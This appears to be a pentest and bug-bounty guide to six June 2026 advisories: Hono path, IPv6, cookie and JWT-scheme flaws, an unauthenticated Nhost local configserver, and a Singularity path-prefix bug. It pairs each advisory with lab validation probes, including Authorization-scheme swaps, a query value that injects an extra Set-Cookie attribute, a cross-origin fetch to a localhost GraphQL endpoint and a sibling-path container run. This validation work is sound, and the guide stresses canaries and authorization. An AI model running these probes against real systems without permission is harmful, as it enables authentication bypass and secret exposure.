# Hono parser/auth, Nhost localhost configserver, and Singularity path-prefix boundaries

## Operator value

GitHub Advisory Database published a compact batch of boundary bugs on June 4, 2026 that is useful for authorized application and platform testing:

- Hono `app.mount()` can route with a decoded path but strip a raw percent-encoded path at a different offset: [GHSA-2gcr-mfcq-wcc3 / CVE-2026-47676](https://github.com/advisories/GHSA-2gcr-mfcq-wcc3).
- Hono `ip-restriction` static rules can miss non-canonical IPv6 spellings of the same address: [GHSA-xrhx-7g5j-rcj5 / CVE-2026-47674](https://github.com/advisories/GHSA-xrhx-7g5j-rcj5).
- Hono `hono/cookie` can accept runtime `sameSite` or `priority` strings that inject extra `Set-Cookie` attributes when an app passes user-controlled values: [GHSA-3hrh-pfw6-9m5x / CVE-2026-47675](https://github.com/advisories/GHSA-3hrh-pfw6-9m5x).
- Hono `jwt` and `jwk` middleware verify the second whitespace-separated token without requiring the `Bearer` scheme: [GHSA-f577-qrjj-4474 / CVE-2026-47673](https://github.com/advisories/GHSA-f577-qrjj-4474).
- Nhost CLI's local `nhost dev` configserver exposes a permissive-CORS, unauthenticated GraphQL API that can read and write local development configuration and secrets: [GHSA-64cj-qvx5-m4f3 / CVE-2026-47671](https://github.com/advisories/GHSA-64cj-qvx5-m4f3).
- SingularityCE / SingularityPRO `limit container paths` can allow sibling paths with the same prefix: [GHSA-wqcr-7rf3-f64m / CVE-2026-47215](https://github.com/advisories/GHSA-wqcr-7rf3-f64m).

For pentest and bug-bounty work, the reusable lesson is not the version number alone. Look for parser disagreement, string-only trust decisions, and local-dev control planes that cross origin or path boundaries.

## Affected surfaces

| Surface | Affected versions | Fixed version | Boundary to test |
| --- | --- | --- | --- |
| Hono `app.mount()` | `< 4.12.21` | `4.12.21` | raw URL pathname slicing versus decoded route matching |
| Hono `ip-restriction` | `< 4.12.21` | `4.12.21` | static IP deny/allow rules versus alternate IPv6 text forms |
| Hono `hono/cookie` | `< 4.12.21` | `4.12.21` | runtime cookie-option strings versus header attribute syntax |
| Hono `jwt` / `jwk` | `< 4.12.21` | `4.12.21` | API-gateway Authorization-scheme policy versus framework token verification |
| Nhost CLI `nhost dev` configserver | `< 1.46.0` | `1.46.0` | arbitrary web origin or local process versus localhost development secrets |
| SingularityCE / SingularityPRO `limit container paths` | SingularityCE `< 4.4.2`; SingularityPRO `< 4.3.9` and `4.1.x < 4.1.14` | SingularityCE `4.4.2`; SingularityPRO `4.3.9` / `4.1.14` | configured allowed container directory versus sibling path prefix |

## Recon workflow

1. Confirm scope allows framework, local-development, or container-platform validation. Do not probe developer localhost services or cluster login nodes without explicit authorization.
2. Inventory exposed Hono apps from code, lockfiles, SBOMs, container images, or agreed test replicas:

   ```bash
   grep -R '"hono"' package.json pnpm-lock.yaml package-lock.json yarn.lock 2>/dev/null
   ```

3. For Hono targets, look for vulnerable primitives in source before sending probes:

   ```bash
   grep -R "app\.mount\|ipRestriction\|hono/ip-restriction\|hono/cookie\|hono/jwt\|hono/jwk" \
     src app server 2>/dev/null
   ```

4. For Nhost assessments, identify whether `nhost dev` is in use and whether the local configserver port is reachable only from the developer machine, from a shared LAN, or through a forwarded/tunneled environment.
5. For Singularity assessments, request the relevant `singularity.conf` excerpt and confirm whether `allow setuid = yes` and `limit container paths` are in effect. Treat shared HPC and CI runner hosts as higher-value validation environments.

## Safe validation patterns

### Hono `app.mount()` percent-encoding boundary

Use a lab clone with a harmless mounted sub-application that echoes the path it receives. The proof is parser disagreement, not access to protected production content.

```ts
import { Hono } from 'hono'

const app = new Hono()
const sub = new Hono()

sub.get('*', (c) => c.json({ subPath: new URL(c.req.url).pathname }))
app.mount('/api/é', sub.fetch)

export default app
```

Send paired requests that differ only in encoded path representation:

```bash
curl -sk 'https://app.example.test/api/%C3%A9/canary'
curl -sk 'https://app.example.test/api/é/canary'
```

A reportable issue needs a security decision behind the mounted app that consumes the mis-stripped path: for example, a sub-route allowlist, tenant selector, webhook dispatcher, or static-file lookup that sees a different path than the router matched.

### Hono IPv6 static-rule bypass

Validate only against an allowlisted lab endpoint. If the application uses `ip-restriction`, compare canonical and non-canonical forms of the same client address at the exact trust boundary that supplies `remoteAddr` / forwarded IP input.

Useful canary pairs for code review or lab proxy tests:

```text
2001:db8::1
2001:db8:0:0:0:0:0:1
::ffff:127.0.0.1
::ffff:7f00:1
```

Evidence should show the configured static rule, the value the middleware evaluated, and whether the request was allowed or denied. Avoid claiming impact when an upstream proxy canonicalizes the address before Hono receives it.

### Hono Authorization-scheme confusion

This is most useful when an API gateway, WAF, or custom middleware applies a policy only to `Bearer` requests while Hono later accepts any two-part `Authorization` header.

```bash
# Baseline accepted token presentation.
curl -sk --oauth2-bearer TEST_TOKEN https://app.example.test/api/canary

# Boundary probe: framework may still verify token while scheme-aware controls do not classify it as Bearer.
curl -sk -H 'Authorization: Basic TEST_TOKEN' https://app.example.test/api/canary
curl -sk -H 'Authorization: Token TEST_TOKEN' https://app.example.test/api/canary
```

Use only a token issued for your test account. A strong finding shows different behavior between edge policy and application authentication, such as a gateway rule skipped on `Basic` while Hono still authenticates the request.

### Hono cookie-option injection

Only test applications that pass request-derived values into `sameSite` or `priority`. A safe proof can use a canary cookie name and a controlled value that appends an inert attribute, not session fixation against real users.

```bash
curl -sk 'https://app.example.test/cookie-preview?sameSite=Lax%3B%20canary_hono_cookie%3D1'
```

Capture the raw `Set-Cookie` line and the code path that maps input into cookie options. If options are compile-time constants, there is no practical injection point.

### Nhost local configserver cross-origin boundary

Run this only in an owned lab or an explicitly authorized developer workstation test. The finding is that a browser origin outside the Nhost dashboard can reach the configserver and read or mutate local project configuration.

1. Start an affected lab environment with `nhost dev`.
2. Identify the local configserver origin from the generated dashboard or Docker Compose output.
3. From a separate local origin, send a harmless GraphQL introspection or benign read for a non-secret canary key.

Example browser-console shape, with the URL replaced by the lab configserver endpoint:

```js
await fetch('http://127.0.0.1:PORT/graphql', {
  method: 'POST',
  headers: { 'Content-Type': 'application/json' },
  body: JSON.stringify({ query: '{ __typename }' })
}).then(r => r.text())
```

Do not publish or copy real `.secrets` values. For impact, create an inert canary secret in the lab and show that an arbitrary origin can read or overwrite only that canary.

### Singularity path-prefix boundary

Validate with empty, harmless container files in a lab host where `limit container paths` is configured. The advisory example is a prefix match such as `/data/safe` also allowing `/data/safe-but-unsafe`.

```bash
# Confirm the configured allow path from authorized config evidence.
grep -n '^limit container paths' /etc/singularity/singularity.conf

# Lab-only canary directories.
mkdir -p /data/safe /data/safe-but-unsafe

# Expected: allowed if policy permits /data/safe.
singularity exec /data/safe/canary.sif true

# Boundary probe: should be denied, but affected matching may allow it.
singularity exec /data/safe-but-unsafe/canary.sif true
```

A reportable result should include the configured directive, exact resolved paths, command output, and proof that the sibling directory was outside the intended allowlist.

## Evidence to capture

- Advisory ID, package/product version, and how the version was verified.
- The exact trust boundary: proxy-to-Hono, gateway-to-framework, browser-origin-to-localhost, or config path-to-sibling path.
- Minimal paired request/command output showing expected versus boundary behavior.
- Source or configuration snippet proving the sensitive decision consumed the vulnerable value.
- Confirmation that validation used lab canaries or test accounts and did not read, write, or disclose sensitive data.

## Report framing

Frame these as boundary and canonicalization failures:

- Hono: the framework and surrounding controls disagree about path representation, IP identity, cookie attribute syntax, or Authorization scheme semantics.
- Nhost: a local developer control plane trusts localhost reachability and permissive CORS more than the browser-origin boundary.
- Singularity: a path allowlist treats a prefix as equivalent to a directory boundary.

Impact depends on what sensitive decision is behind the primitive. Avoid version-only reports; include the concrete route, policy, secret canary, or container execution boundary that changed behavior.

## Sources

- GitHub Advisory Database: [GHSA-2gcr-mfcq-wcc3 / CVE-2026-47676](https://github.com/advisories/GHSA-2gcr-mfcq-wcc3)
- Hono project advisory: [GHSA-2gcr-mfcq-wcc3](https://github.com/honojs/hono/security/advisories/GHSA-2gcr-mfcq-wcc3)
- GitHub Advisory Database: [GHSA-xrhx-7g5j-rcj5 / CVE-2026-47674](https://github.com/advisories/GHSA-xrhx-7g5j-rcj5)
- Hono project advisory: [GHSA-xrhx-7g5j-rcj5](https://github.com/honojs/hono/security/advisories/GHSA-xrhx-7g5j-rcj5)
- GitHub Advisory Database: [GHSA-3hrh-pfw6-9m5x / CVE-2026-47675](https://github.com/advisories/GHSA-3hrh-pfw6-9m5x)
- Hono project advisory: [GHSA-3hrh-pfw6-9m5x](https://github.com/honojs/hono/security/advisories/GHSA-3hrh-pfw6-9m5x)
- GitHub Advisory Database: [GHSA-f577-qrjj-4474 / CVE-2026-47673](https://github.com/advisories/GHSA-f577-qrjj-4474)
- Hono project advisory: [GHSA-f577-qrjj-4474](https://github.com/honojs/hono/security/advisories/GHSA-f577-qrjj-4474)
- GitHub Advisory Database: [GHSA-64cj-qvx5-m4f3 / CVE-2026-47671](https://github.com/advisories/GHSA-64cj-qvx5-m4f3)
- Nhost project advisory: [GHSA-64cj-qvx5-m4f3](https://github.com/nhost/nhost/security/advisories/GHSA-64cj-qvx5-m4f3)
- GitHub Advisory Database: [GHSA-wqcr-7rf3-f64m / CVE-2026-47215](https://github.com/advisories/GHSA-wqcr-7rf3-f64m)
- Singularity project advisory: [GHSA-wqcr-7rf3-f64m](https://github.com/sylabs/singularity/security/advisories/GHSA-wqcr-7rf3-f64m)
